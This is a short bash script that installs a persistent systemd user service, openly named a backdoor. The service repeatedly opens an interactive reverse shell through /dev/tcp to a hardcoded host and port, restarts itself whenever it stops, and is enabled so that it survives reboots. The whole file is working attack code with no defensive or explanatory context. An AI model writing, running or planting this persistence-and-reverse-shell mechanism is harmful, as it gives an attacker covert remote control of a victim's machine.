#!/bin/bash

# Requires root access

IP="10.2.45.121"
PORT="7001"

echo -e "[Unit]
Description=My Exclusive Backdoor Service (User)

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 10; done\"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
" > /home/$USER/.config/systemd/user/backdoor-user.service

systemctl --user enable /home/$USER/.config/systemd/user/backdoor-user.service
